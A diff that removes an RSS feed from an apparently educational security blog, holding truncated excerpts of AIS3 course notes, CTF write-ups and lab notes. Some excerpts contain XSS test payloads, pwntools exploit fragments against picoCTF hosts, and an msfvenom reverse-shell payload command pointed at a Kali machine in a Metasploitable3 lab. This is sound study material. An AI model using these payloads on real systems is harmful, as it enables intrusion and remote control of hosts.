@@ -1,111 +1,1632 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ctf on ErrorPro</title><link>https://ja-errorpro.codes/tags/ctf/</link><description>Recent content in Ctf on ErrorPro</description><generator>Hugo</generator><language>zh-Hant-TW</language><lastBuildDate>Thu, 01 Aug 2024 00:00:00 +0800</lastBuildDate><atom:link href="https://ja-errorpro.codes/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>【AIS3】API 安全</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_1/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_1/</guid><description>API 安全 -中華資安國際 資安研究員 zodius
-技術簡介 What is API? 點炒飯 跟廚師說一份炒飯 叫廚師打蛋切菜&amp;hellip; 好處 把商業邏輯或業務邏輯封裝成簡單邏輯
-本質：封裝 無需關注細節，專注自己業務邏輯 透過介面溝通，可同時開發 前後端邏輯分離，減少流量與資料相依性 API 發展 RPC 跨電腦溝通, ex: 轉帳、查詢 隨 http 發展演變成 Web service 專注於特定任務 SOAP 傳輸 XML 格式協議 WSDL 約定 interface web service 提供參數 缺點 - GetFile() 可能很多種定義 範圍混亂，如何拆分沒有統一標準 SOAP header - 方法 body - 正式請求 Google hacking wsdl 可能可以找到很多酷東西
-可從中獲得網站資訊
-RESTful API 解決範圍定義問題
-Header
-method GET POST PUT DELETE HEAD OPTIONS CONNECT TRACE URL version Representational State Transfer 狀態轉移</description></item><item><title>【AIS3】Cloud Security</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_2/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_2/</guid><description>Cloud Security -中華資安國際 資安研究員 黃聖筌 Husky
-雲端基本介紹 為啥上雲 實現靈活的資應用 幫助企業降低成本支出 按一按就可以升級 資安沒做好還是會噴$$
-降低行業入門門檻 節省實體硬體成本 專注於業務發展 不須管理硬體與伺服器維運 故障機率低 除了前幾天的 Azure 安全? 不安全 雲端介紹 責任 出問題時可以踢皮球
-責任歸屬 使用者永遠保有下面責任 資料 CSA Top11 Insufficient identity, credentials, access, and key Management Insecure interfaces and application programming interfaces (APIs) Misconfiguration and inadequate change control Lack of cloud security architecture and strategy Insecure software development Unsecured third-party resources System vulnerabilities Accidental cloud data disclosure Misconfiguration and exploitation of serverless and container workloads Organized crime/hackers/advanced persistent threats (APTs) Cloud storage data exfiltration https://blog.</description></item><item><title>【AIS3】前端不只有 alert 可以彈</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_3/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_3/</guid><description>前端不只有 alert 可以彈 -DEVCORE 資安研究員 黃志仁 splitline
-安全原則 同源政策 A 網站不能讀 B 網站的東西(Browser 層限制) 可能可以寫 CSRF(Cross-Site Request Forgery) superlogout.com 點進去會把一堆服務登出，按進去請小心 偽造 client 端的惡意請求 即使使用 POST 也有機會被攻擊 CSRF Token 使用者訪問網站時被設定一個 token 放在 cookie 發送請求需同時送出 token 不能 CSRF 的情況 非 GET 或 POST 請求 特殊 HTTP header Samesite Cookie Lax 只有 &amp;lt;a&amp;gt;、&amp;lt;link&amp;gt;、&amp;lt;form method=&amp;quot;GET&amp;quot;&amp;gt; 會帶 cookie 在 Chrome、Edge 上預設 Strict 不論如何都不會從其他地方把 cookie 帶過來 None 不論如何都會帶 cookie 新版標準需要帶 Secure XSS Cross-Site Scripting 讓使用者瀏覽器執行駭客給的任意 Script Self-XSS 自己手動把 Script 跑起來 XSS Category Reflected XSS 惡意輸入一次性的映射 (Reflect) 到網頁上 ex: 搜尋欄輸入 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; 後按下搜尋彈出 alert Stored XSS 伺服器會儲存 (store) 駭客的惡意輸入 ex: 留言板有惡意腳本，所有人看到都會執行 DOM-based XSS JavaScript 讀取惡意輸入造成 XSS Event Handler &amp;lt;svg/onload=alert(1)&amp;gt; &amp;lt;img src=x onerror=alert(1)&amp;gt; &amp;lt;input onfocus=alert(1)&amp;gt; javascript: Scheme &amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;click me&amp;lt;/a&amp;gt; location.</description></item><item><title>【AIS3】Gadget 不只有 POP 可以用</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_3/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_3/</guid><description>Gadget 不只有 POP 可以用 -undefined 戰隊 林宇翔
-ROP gadgets 【系統安全】Stack Overflow Basic ROP lab01 solution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #!/usr/bin/env python3 from pwn import * elf = context.binary = ELF(&amp;#39;./rop1&amp;#39;) context.os = &amp;#39;linux&amp;#39; context.arch = &amp;#39;amd64&amp;#39; context.log_level = &amp;#39;DEBUG&amp;#39; if args.REMOTE: ip = &amp;#39;35.</description></item><item><title>【AIS3】永不停歇的競逐 - 威脅研究員與資安女力的挑戰</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_4/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_4/</guid><description>永不停歇的競逐 - 威脅研究員與資安女力的挑戰 -TXOne Networks Inc. 威脅研究經理 Mars Cheng ＆ DEVCORE 技術專案經理 Hazel Yen
-TXOne 介紹 OT security issue
-OT security market
-Mars 學生時期 reverse engineering with SDR 就業時期 國家資通安全研究院 資安工程師 工控 趨勢科技 資安威脅研究員 TXOne 威脅研究經理 CCPA
-手機鑑識 無法補洞 -&amp;gt; 高強度監控
-urgent/11
-data-link bus
-:star: cybersec, RSA (concept, 未來發展) 多看 conference
-CVE 流程 廠商是 CNA 只有廠商或 ro ot CNA 可以核發自己的漏洞 不是 CNA 可以自己申請 CVE 由其他 CNA 核發 會記錄廠商不認定漏洞 廠商可不修補 OPSEC 攻擊者行為在受監控下不會被偵測到</description></item><item><title>【AIS3】深入淺出網域(AD)安全:細探各項AD組態設定的濫用</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_1/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_1/</guid><description>深入淺出網域(AD)安全:細探各項AD組態設定的濫用 -TXOne Networks Inc. Threat Researcher Dexter Chen
-教材 Windows Server 2019 Windows 10 Kali Linux Active Directory Windows Domain Service LDAP(Lightweight Directory Access Protocol) + Kerberos(MS ver.) + DNS SSO Services (Base on Kerberos) AD Overview Active Directory (AD) - Directory Service Domain Controller (DC) 某台存著 AD 資料庫、管理網域中 AD Object 的電腦，提供驗證服務 Domain Directory 存在 DC 一個網域可以有多個 DC Object Attribute Forest LDAP Overview LDAP Path DN(Distinguished Name) RDN(Relative Distinguished Name) CN(Common Name) OU(Organizational Unit Name) DC(Domain Component) O(Organizational Unit) User, Computer, and Group Account User Account Person or service account Computer Account Group Active Directory objects that contain users, contacts, computers, and other groups Group Policy 作用於 User, Computer Accounts Security Identifier (SID) 識別唯一安全原則或安全群組 可以代表 User, Group, Computer Active Directory Database AD DS database (NTDS.</description></item><item><title>【AIS3】網頁動態安全檢測與報戶 (RASP)</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_2/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_2/</guid><description>網頁動態安全檢測與報戶 (RASP) -中華資安國際 資安研究員 zodius
-Lab: https://github.com/zodius/rasp-lab
-Introduction 防護邊界 firewall WAF IPS 攻擊 內部攻擊 感染設備 雲端服務 傳統網路防護模型 外部檢查 DDOS IPS/IDS WAF firewall 應用程式 code effort 端點防護 EDR/MDR SOC 預防 vs 偵測 prevention 偵測特徵 缺點：混淆、新型態攻擊 detection 發生傷害 應變 RASP Real-time Application Self-Protection hook 系統底層的 instruction 執行前做檢核 四個特性 避免混淆或序列化 精準阻擋 - 執行前先判斷，避免誤殺 偵測未知漏洞 - 不使用特徵偵測 結合 SIEM 回顧計算機組織 Source -&amp;gt; Transform -&amp;gt; Intermediate -&amp;gt; Execution
-Source Source Code Serialized code Transform Compile Interpret bytecode Intermediate IL(中間碼) &amp;lt;- RASP Execution VM JIT Machine code &amp;lt;- RASP 偵測 IL、Machine code</description></item><item><title>【AIS3】IDA 不只有 F5 可以按 IDA 101, Reverse 101</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_2/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_2/</guid><description>IDA 不只有 F5 可以按 IDA 101, Reverse 101 -undefined 戰隊 林祐聖 ＆ 陳兆閔 ＆ TeamT5杜浦數位安全 RD 林哲宇
-IDA 介紹 IDAFree/IDAPro/IDATeam 如何使用 IDA(新手) 開 binary 一路按 ok F5 沒反應 IDA Free@ubuntu Fix Qt套件更新
-sudo apt install libxcb-xinerama0 IDA Free - load ELF/PE/MachO hex view disassemble decompile function 藍 library func 紫 external symbol 白 regular func 搜尋:
-直接輸入:從頭匹配 [ctrl+f5]:模糊搜尋 option-&amp;gt; general disassembly view (graph) 圖形化 若case夠多，會變成 jump table
-disassembly view (text) 優點:</description></item><item><title>【AIS3】IoT 檢測實務</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_3/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_3/</guid><description>IoT 檢測實務 -中華資安國際 副理 王凱慶 Keniver
-Introduction IoT 拿不到韌體 -&amp;gt; 不能逆向 IoT 在哪裡 關鍵基礎設施 環境監測 控制關鍵設施 商業 廣告系統 生產自動化 門禁系統 社會安全 科技執法 交通控制 家中 智慧家庭 醫療照顧 IoT 設備、惡意程式數量持續增加
-IoT 生態系 設備產業生態系 由於硬體與其程式可以被重複利用與整合於其他產品中，因此ODM 廠商可能會與多間OEM 廠商合作，進而拓展經濟規模。 這樣的架構下ODM 的硬體與軟體會被複製到多個OEM 產品上，若ODM 廠商未建立良善的安全開發流程，而OEM 廠商也只改個Logo 就將其出品，那就可能導致一家烤肉萬家香一個漏洞萬家通用的現象發生。
-華為 -&amp;gt; 海康衛視 -&amp;gt; SOC -&amp;gt; 雄邁 -&amp;gt; OVM 監視器廠商
-登入頁面差不多 外觀 為何研究 IoT 數量多, 通用性高, 洞好找 效能要求 廠商方便，不加保護 OWASP IoT Top 10 I1 Weak Guessable, or Hardcoded Passwords 弱密碼 I2 Insecure Network Services 運行不必要甚至不安全的網路服務 ex: open 7000 port -&amp;gt; 一直拿到 GPS 資訊</description></item><item><title>【AIS3】從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_4/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_4/</guid><description>從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招 -undefined 戰隊 林祐聖 ＆ 陳兆閔 ＆ TeamT5杜浦數位安全 RD 林哲宇
-Link Start! 分析目標的五個階段 理想 執行方式 -&amp;gt; 分析方式 -&amp;gt; 觀察目標 -&amp;gt; 理解邏輯 -&amp;gt; 寫腳本 現實 跳來跳去 執行方式(Debug 能力) 作業系統版本、架構不對 執行環境架不起來 缺少相依套件 相依套件版本不對 分析方式(Survey 能力) 找不到適合分析目標的工具 不知道目標如何實作 ex: IDA 分析 C#
-觀察目標(觀察力) golang, rust 找不到關鍵處 IDA 一堆 Function 理解邏輯(逆向能力) 看 Code 速度 理解程式在做什麼 猜出題者想做什麼 寫腳本(程式、工具使用) 不會寫程式 工具不熟悉 ex: z3, pwntools, gdb script&amp;hellip; 資料結構、演算法不熟 ex: 有向循環圖找一條路徑滿足特定條件 CTF Reverse 做以下假設幫助思考 題目一定有 flag -&amp;gt; 出題者用某種方式把 flag 藏起來 達到某個條件會觸發計算或驗證 flag 的操作 驗證類型：輸入正確時輸出 correct，反之 wrong 計算類型：執行到特定程式碼解密出 flag 出題者通常基於什麼做出題目的 ex: 某專案、工具、論文 工具 Detect It Easy 確認 binary 類型 如何實作 是否加殼 CFF Explorer 觀察 PE 結構 更改結構設定 Cheat Engine 記憶體掃描 Process Monitor Sysinternals kit 監控紀錄系統行為 CTF 看到以下事件可多關注 network file write process create IDA Pro 反組譯、反編譯 idapython plugin x64dbg x64dbgpy 不能 debug windows kernel -&amp;gt; windbg PACMAN - 2023 AIS3 Pre-exam 觀察 DIE 取得 PE 檔案資訊</description></item><item><title>【AIS3】資安倫理</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_1/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_1/</guid><description>資安倫理 -法務部調查局 調查官 陳彥后
-前言 去年資安人力吃緊，今年沒有改善。
-資安事件回應、情資分析佔最多缺額
-企業資安預算逐年提高
-這是最好的時代，也是最壞的時代
-認清工作現實 資安的工作，絕大多數絕非學生時期的 CTF 及各式競賽 更多的是產品的開發及服務的提供 平凡到超絕 人力 -&amp;gt; 人才 -&amp;gt; 人物 基本法律觀念 前科 個人資料保護法施行細則第 4 條第 6 項 警察刑事紀錄證明核發條例第 6 條但書另規定 無法申請良民證 無法出入境某些國家 從事公職及特定部分工作 刑事流程 妨害電腦使用罪 刑法第 358 條至第 363 條 358 - 無故輸入他人帳號密碼、破解使用電腦之保護措施或利用電腦系統之漏洞，而入侵他人之電腦 359 - 無故取得、刪除或變更他人之電腦資料 360 - 無故以電腦程式或其他電磁方式干擾他人電腦或其相關設備，致生損害於公眾或他人者，處三年以下有期徒刑、拘役或科或併科十萬元以下罰金。 361 - 對於公務機關之電腦或其相關設備犯前三條之罪者，加重其刑至二分之一 362 - 製作專供犯本章之罪之電腦程式，而供自己或他人犯本章之罪，致生損害於公眾或他人者，處五年以下有期徒刑、拘役或科或併科二十萬元以下罰金。 製作 malware 363 - 第 358 條至第 360 條須告訴乃論。 361, 362 非告訴乃論 實際案例 自架 DDoS 提供網站，以政府單位為目標，錄製攻擊過程並放在 YT 上招攬生意 拿女友帳號改感情狀況 打進校務系統改全校成績 與公司人員相處不睦離職，將公司配發於公務使用電腦，私人檔案及公司相關檔案刪除 個人資料保護法 個資</description></item><item><title>【AIS3】The Journey of Becoming a Vulnerability Researcher</title><link>https://ja-errorpro.codes/posts/2024/ais3_d1_1/</link><pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d1_1/</guid><description>The Journey of Becoming a Vulnerability Researcher -DEVCORE 資深資安研究員 楊安傑 Angelboy
-案例 WannaCry(Eternel Blue) CrowdStrike BSOD Bug Hunting 主動找尋可能的漏洞 漏洞可能造成的危害 Remote Command Execution Privilege Escape Information Disclosure Denial of Service Vulnerability Researcher 漏洞挖掘分析 攻擊手法研究 How to Start Prepare the required knowledge 計概、計組、C語言、asm、OS 程式設計師的自我修養 Binary HACKS The Art of Software Security Assessment 台大台科交大聯合課程 實作 AIS3 MyFirstCTF 台灣好厲駭 pwn.college Live Overflow CTF 一場好的 CTF 會讓你學到技術
-0ctf 2019 - AddressSanitizer 保護機制 *ctf - oob-v8，怎麼打 Browser 0ctf 2020 - Chromium RCE DEFCON 2022 QUAL - ncuts，兩萬多個 binary 解 reverse 拼出 flag.</description></item><item><title>【AIS3】威脅情資＆機器學習</title><link>https://ja-errorpro.codes/posts/2024/ais3_d1_2/</link><pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d1_2/</guid><description>威脅情資＆機器學習 -奧義智慧科技 資安研究處長 陳仲寬 ＆ 資安研究員 陳憶賢 ＆ 資安研究員 黃俊嘉 ＆ 資安研究員 陳勝舢
-About the Course We believe AI will change the landscape of cybersecurity, therefore, in this course, we would like to combine the AI and CTI applications.
-Goal: Understand the basic concept of CTI Apply ML/AI to solve CTI problems 威脅情資概述 What is Threat Intelligence? 知己知彼，百戰不殆 Every contact leaves a trace Actionable Threat Intelligence 情資有相當多呈現方式，不是每種場域都適合 有什麼樣的情資 如何使用情資 情資可應用程度 「公部門易受外網攻擊，成功阻擋的防禦率高」 == 屁話</description></item><item><title>【AIS3】面對國家級關鍵基礎設施網路攻擊威脅: 從工業控制系統到網路攻防</title><link>https://ja-errorpro.codes/posts/2024/ais3_d1_3/</link><pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d1_3/</guid><description>面對國家級關鍵基礎設施網路攻擊威脅: 從工業控制系統到網路攻防 -TXOne Networks Inc. Senior Threat Researcher Yenting Lee
-關鍵基礎設施(CI) 與工業控制系統(ICS) 現狀 對產業特性、網路架構及相關經驗不熟悉 資安人員少接觸 不知道產業實務應優先考慮的事項 最初設計沒對資安做考量 大綱 關鍵基礎設施 工業控制系統 ICS 攻擊策略 CI 防禦策略 關鍵基礎設施 (CI) 受到衝擊會影響國家經濟，自然環境或社會安全等設施
-各國對 CI 定義稍有不同
-大多與能源、交通、醫療、通訊、金融、政府相關 美國 CI 賭場 飯店 核能 國家級 CI 網路攻擊 2009 Stuxnet 對伊朗核能設施攻擊 離心機異常加速 多個 0 day 漏洞 第一個針對工業控制環境的攻擊 2015 俄羅斯沙蟲團隊針對烏克蘭電網 破壞為目的 大量妨礙策略 2023 丹麥能源產業攻擊鏈 偵查 武裝 遞送 漏洞利用 安裝 命令控制 行動 針對 CI 攻擊不一定要用一堆 0 day 為何 CI 難防攻擊 產業結構龐大 醫療保健產業: 個資外洩 供應鏈關係緊密 半導體產業: 供應鏈關係緊密 (設計-&amp;gt;製造-&amp;gt;封裝) 工業控制系統環境 工業控制系統 (ICS) 普渡模型 Layer 0 物理設備 感測器 Layer 1 控制器 PLC Layer 2 人機介面 HMI 現場設備顯示/控制 Layer 3 OT 環境伺服器 搜集、分析資料 Layer 4/5 * 風險管理需求 IT OT CIA 強調可用性 3~5 年更新 10~20 年更新 可任意擴充 無法自行安裝任何軟體安全性套件 非即時性系統 即時性系統 可依需求重開機 不可任意重開機 一般通訊協定 ICS 通訊協定 OT 環境的脆弱性 內部威脅: 第三方工程師或廠商設備 老舊系統: 許多作業系統或設備已終止支援 網路扁平: 網路未適當分割 更新限制: 設備保持運行，難以實現更新流程 不進行螢幕鎖定 可程式化邏輯控制器 (PLC) 用來執行特定的工作，達到自動化控制現場設備 PLC 如何程式化 IEC 61131-3 標準定義 PLC 程式 5 種語言進行程式撰寫 圖形化 階梯圖(Ladder Diagram, LD) 功能區塊圖(Function Block Diagram, FBD) 順序功能流程圖(Sequential Function Chart, SFC) 文字(Python) 指令表(Instruction List Diagram, ILD) 結構化文字 STL OT 環境架構 工程師電腦有最高權限 安全性 Safety !</description></item><item><title>【Pico】Pwn 系列解題紀錄</title><link>https://ja-errorpro.codes/posts/picoctf/pwn/</link><pubDate>Tue, 16 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/picoctf/pwn/</guid><description>【Pico】Pwn 系列解題紀錄 這篇只是用來放解題的程式碼，之後再補解題過程。
-heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python3 from pwn import * context.binary = &amp;#39;./chall&amp;#39; context.os = &amp;#39;linux&amp;#39; context.arch = &amp;#39;amd64&amp;#39; context.log_level = &amp;#39;DEBUG&amp;#39; if args.REMOTE: ip = &amp;#39;tethys.picoctf.net&amp;#39; port = 49849 p = remote(ip, port) else: p = process() p.sendline(&amp;#34;2&amp;#34;) p.sendline(b&amp;#34;a&amp;#34;*50) p.sendline(b&amp;#34;4&amp;#34;) p.interactive() heap1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #!</description></item><item><title>【系統安全】Stack Overflow</title><link>https://ja-errorpro.codes/posts/2024/stack_overflow/</link><pubDate>Fri, 05 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/stack_overflow/</guid><description>先備知識 【系統安全】組合語言 【系統安全】Linux 安全機制 Stack Overflow Stack 回顧 Memory Layout，Stack 是一種後進先出的資料結構，在記憶體上由高位址往低位址長，上面會保存函式呼叫的資訊、區域變數。
-注意 32 位元與 64 位元 的差別：
-x86: 函式參數會放在 return address 上方 x64: System V AMD64 ABI，前 6 個整數參數依序放在 rdi, rsi, rdx, rcx, r8, r9, 後面如果還有才會放在 stack 上。 Stack Overflow 當程式輸入資料的大小超過 buffer 的大小，會蓋到該 buffer 之後的記憶體，稱為 Overflow，而 Stack Overflow 表示在 stack 上發生了 Overflow。另外還有 Heap Overflow 表示在 heap 上發生了 Overflow。
-Concept 尋找危險函式，可以確認是否有 buffer overflow，常見的危險函式有 gets, scanf, strcpy, strcat, sprintf, vsprintf 確定 padding 長度，計算要蓋到的地址離 buffer 的距離 如果要蓋 return address，直接看 frame pointer 位置然後找出偏移 如果要蓋 stack 上特定資料，需要先觀察 stack 上的資料再找出偏移 希望透過覆蓋記憶體位址來控制程式的執行流程 ROP 用於繞過 NX 保護的漏洞利用技術 利用程式碼已有的片段，拼出想要的功能，而控制程式執行流程 這些片段稱為 gadget，通常以 ret 結尾 可使用 ROPgadget, ropper, pwntools 來找 gadget ret2win ret2shellcode ret2syscall ret2libc GOT</description></item><item><title>【CTF-WriteUp】AIS3 Pre-Exam 2024</title><link>https://ja-errorpro.codes/posts/2024/ais3_pre_exam_2024/</link><pubDate>Tue, 11 Jun 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_pre_exam_2024/</guid><description>AIS3 Pre-Exam 2024 先放結果
-My First CTF：潛力獎
-心得 第一次參加 My First CTF 跟 AIS3 Pre-Exam，最後有幾題到比賽結束才解出來，覺得滿可惜的，
-希望下次能通靈出更多題目。
-Write Up Misc Welcome 簽到題
-FLAG: AIS3{Welc0me_to_AIS3_PreExam_2o24!}
-Quantum Nim Heist Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other. 跟電腦玩 Nim 遊戲，Wiki - Nim，
-這裡的規則是拿走最後一棵石頭的人獲勝，而根據組合賽局理論，把每堆石頭數 XOR 後若為 0 則後手必勝，否則先手必勝。
-看到 server.py
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def menu(): print_main_menu() choice = input(&amp;#39;what would you like to do?</description></item><item><title>【資訊安全】Metasploitable3 滲透測試實作（筆記）</title><link>https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/</link><pubDate>Sat, 20 Apr 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/</guid><description>先備知識 知道如何使用 VMware 或 VirtualBox Kali Linux 基本操作 能夠讓 Kali 連線至 Metasploitable3 良好的網路環境 確認 IP Win2k8:
-1 ipconfig ub1404:
-1 ifconfig 弱點掃描 使用 Nmap 將所有 port 掃描一遍，查看主機上開啟的 Service
-1 sudo nmap -sV -sS -n -v --reason --open -p- &amp;lt;Metasploitable3 IP&amp;gt; &amp;lt;Metasploitable3 IP&amp;gt; 請替換成靶機 IP
-文件上傳漏洞 掃描 8585 port 是否存在文件上傳漏洞
-1 davtest -url http://&amp;lt;Metasploitable3 IP&amp;gt;:8585/uploads/ 利用 msfvenom 生成 reverse shell payload 1 msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Kali IP&amp;gt; LPORT=4444 -f raw &amp;gt; payload.</description></item><item><title>【HTB】Sacred Scrolls: Revenge</title><link>https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/</link><pubDate>Tue, 05 Mar 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/</guid><description>【HTB】Sacred Scrolls: Revenge Description Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.
-Checksec 1 2 3 4 5 6 7 [*] &amp;#39;/home/err0rpro/CTFLab/Hackthebox/SacredScrollsRevenge/sacred_scrolls&amp;#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b&amp;#39;.</description></item><item><title>【CTF】Heap Exploitation(Part 1 - Overview, UAF)</title><link>https://ja-errorpro.codes/posts/2023/ctf_heap/</link><pubDate>Thu, 16 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_heap/</guid><description>Heap Exploitation 預備知識 需要注意glibc的版本 知道典型的Memory layout 記憶體計算 1. Heap Overview 跟資料結構的Heap不同 存動態資料的記憶體區段 在Memory中由低往高生長 Allocator Linux中由glibc實作 dlmalloc (Doug Lea Malloc) - General-purpose allocator ptmalloc (Per-thread malloc) - glibc jemalloc - FreeBSD / Firefox / Facebook&amp;hellip; tcmalloc - Google / Golang / Chrome&amp;hellip; malloc dynamic memory allocator 第一次呼叫 malloc 1 2 3 4 5 6 if(要分配的大小小於128KB){ if(是第一次呼叫) 呼叫 brk() -&amp;gt; sys_brk() 分配 132KB 的Segment，此Segment稱為 main arena }else{ // 超過128KB mmap() -&amp;gt; sys_mmap() } 程式執行中free掉記憶體後不會馬上還給系統，會由glib代管 Chunk glibc做記憶體管理的資料結構 malloc分配的空間單位，分配出來的大小必須對齊0x10 Ex: malloc(0x15) -&amp;gt; 得到大小 0x20 + 0x10(header) 的chunk 依大小分類，發生free時會放到linked list中，這個linked list稱為bin fastbin (&amp;lt;64B) smallbin (&amp;lt;512B) largebin (&amp;gt;=512B) unsortedbin (如果free的chunk大小&amp;gt;64B，先放到這裡一段時間後再加到對應的bin) 種類 Allocated Chunk prev_size: 如果前一個chunk是free的，就存前一個chunk的大小 size: 這個chunk的大小 + Status flag(最後3個bit)(因為0x10 padding，後面4bit可以不存) bit 0: PREV_INUSE: 前一個chunk是否正被使用 bit 1: IS_MMAPPED: 是否是mmap分配的 bit 2: NON_MAIN_ARENA: 是否不是main arena User Data Free Chunk prev_size size fd: 指標指向下一個chunk bk: 指標指向上一個chunk fd_nextsize: 下一個largebin的指標 bk_nextsize: 上一個largebin的指標 Data Top Chunk prev_size size: 還剩多少空間 1 2 3 4 5 6 7 8 9 10 struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).</description></item><item><title>【CTF】CTF工具集</title><link>https://ja-errorpro.codes/posts/2023/ctf_tools/</link><pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_tools/</guid><description>CTF工具集 基本工具 Python 2+3 &amp;amp; pip Editor: vim, vscode, notepad Git Kali Linux 掃描工具 工具名稱 種類 說明 nmap web 弱點掃描 dirsearch web 網站目錄掃描 nikto web Web server漏洞掃描 dirb web 網站目錄掃描 sqlmap web SQL Injection 測試 wpscan web WordPress漏洞掃描 CyberChef web 線上多功能解 Code 工具 Burp Suite web Web 測試工具 WireShark web 封包分析 Ghidra reverse 逆向工具 IDA Pro reverse 逆向工具 crypto stego misc forensics android windows</description></item><item><title>【CTF】Nmap</title><link>https://ja-errorpro.codes/posts/2023/nmap/</link><pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/nmap/</guid><description>Nmap Nmap Download
-Debian安裝
-1 sudo apt install nmap 使用
-1 nmap -sC -sV &amp;lt;ip/hostname&amp;gt; -sC: 使用預設的Nmap腳本(&amp;ndash;script=default) -sV: 啟用版本偵測(-A) -T4: 設定掃描速度為4(1-5)，預設為3 -sS: 送TCP SYN封包來掃描 -sT: 掃描時使用系統呼叫API送封包(猜作業系統版本，需要root) -p: 指定port -Pn: 跳過Ping掃描，全當存活服務(避免防火牆拒絕) -4: 強制使用IPv4 -6: 強制使用IPv6</description></item><item><title>【CTF】密碼學-RSA加密演算法</title><link>https://ja-errorpro.codes/posts/2023/rsa/</link><pubDate>Fri, 03 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/rsa/</guid><description>RSA加密演算法 簡介 由三位數學家Rivest、Shamir、Adleman所提出，RSA就是他們的姓氏第一個字母組成的。 非對稱加密演算法(公鑰加密演算法)。 一般有1024、2048、4096位的金鑰長度，位是二進位位元數 生成金鑰過程 選兩個質數$p$、$q$，$p\neq q$。 算 $\phi(pq) $，其中 $\phi(n)$ 為歐拉函數，表示小於 $n$ 且與 $n$ 互質的正整數個數，歐拉定理 $\phi(pq) = (p-1)(q-1)$。 選一個數 $e$，使 $1 \leq e \leq \phi(pq)$ 且 $e$ 與 $\phi(pq)$ 互質。 找一個數 $d$，使 $ed \equiv 1 \pmod{\phi(pq)}$，即 $ed$ 除以 $phi(pq)$ 的餘數 $ = 1$。 4-1. 這步就是在求 $e$ 關於 $\phi(pq)$ 的模逆元，可以用擴展歐幾里得法求，參考：算法筆記-數論 $p$、$q$、$e$ 組成公鑰 $(n,e)$，$p$、$q$、$d$ 組成私鑰 $(n,d)$。 加密過程 將明文字串 $m$ 轉換成數字(ASCII)陣列。 一個數一個數加密，設數字為 $x$，計算 $x^e\ mod\ 